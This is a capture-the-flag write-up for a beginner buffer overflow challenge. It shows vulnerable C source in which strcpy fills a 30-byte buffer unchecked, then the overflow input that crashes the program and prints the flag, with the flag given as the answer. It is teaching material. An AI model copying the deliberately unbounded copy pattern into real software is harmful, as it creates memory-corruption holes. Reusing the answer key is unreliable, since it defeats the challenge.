# buffer overflow
# Auther:- (Ankit Kumar and Sanjivan Pal) 

## Category
Binary Exploitation Reversing (easy)(need terminal)

## Question
>Let's start off simple, can you overflow the buffer in this [program](files/vuln) to get the flag?
>If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

### Hint(not to be given)
>THis code takes two arguments first argument is already given in code "BUFFER" and second argument is the main buffer which we have to overflow

## Solution
We can try pwning the binary locally first. Firstly, create a file _flag.txt_ and add some contents into it.

Do a sample run of the program.

```
$ ./vuln 
This program takes 2 argument.
```

Ok, now we try with an argument

```
$ ./vuln AAAA
This program takes 2 argument.
```

Seems like it's redirecting the input into output. Let's take a look at the source code.


```
$ cat vuln.c
c

// Imports here...
// Define flag size here...
#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}
int new(char * input) {
  int check = 1;
  char * a[6] = {
    'B',
    'U',
    'F',
    'F',
    'E',
    'R'
  };
  for (int i = 0; i < 6; i++) {
    if (input[i] != a[i]) {
      check = 0;
      break;
    }
  }
  if (!check) {
   

    printf("\ninvalid first input.\n");
    return 0;

  } else
    return 1;
}
void vuln(char * input) {
  char buf[30];
  strcpy(buf, input);
}

int main(int argc, char ** argv) {

  FILE * f = fopen("flag.txt", "r");

  if (f == NULL) {
    printf("Flag File is Missing.\n");
    exit(0);
  }

  if (argc > 2) {

    printf("Received: %s\n", argv[2]);
  } else {
    printf("This program takes 2 argument.\n");
    return 0;
  }

  fgets(flag, FLAGSIZE_MAX, f);
  signal(SIGSEGV, sigsegv_handler);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  if (!new(argv[1])) return 0;
  vuln(argv[2]);

  return 0;
}
```

It looks like the `signal(SIGSEGV, sigsegv_handler)` redirects execution to `sigsegv_handler()` and prints the flag.

In `vuln()`, there is no boundary checking, so even though there is only space for 30 bytes, it `strcpy()` will keep inserting bytes into `buf`.
as we can see the first argument is given in the code 'BUFFER' and 2nd argument is the main one which we have to overflow
We can try running the program again, but this time, with a lot more characters in second argument.

```
$ ./vuln BUFFER AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
VishwaCTF{3asy_R3v3rs1ng}
```

We did it locally! It takes 32 or more bytes to leak out the flag.

All we have to do is send it to the webshell.

```
$ /problems/buffer-overflow-/vuln BUFFER AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
VishwaCTF{3asy_R3v3rs1ng}
```

### Flag
VishwaCTF{3asy_R3v3rs1ng}`
